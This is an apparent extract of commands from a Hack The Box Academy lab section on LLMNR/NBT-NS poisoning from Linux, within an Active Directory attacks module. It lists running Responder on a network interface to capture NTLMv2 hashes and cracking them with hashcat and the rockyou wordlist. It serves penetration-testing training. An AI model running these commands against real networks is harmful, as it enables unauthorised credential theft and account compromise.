# Section 6: LLMNR/NBT-NS Poisoning - from Linux

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1272
- Code/command blocks: 4

> Terminal output is omitted; only commands & scripts are captured.

## 1. `shellsession` _(output omitted)_

```bash
responder -h
```

## 2. `shellsession` _(output omitted)_

```bash
ls
```

## 3. `bash`

```bash
sudo responder -I ens224
```

## 4. `shellsession` _(output omitted)_

```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
```

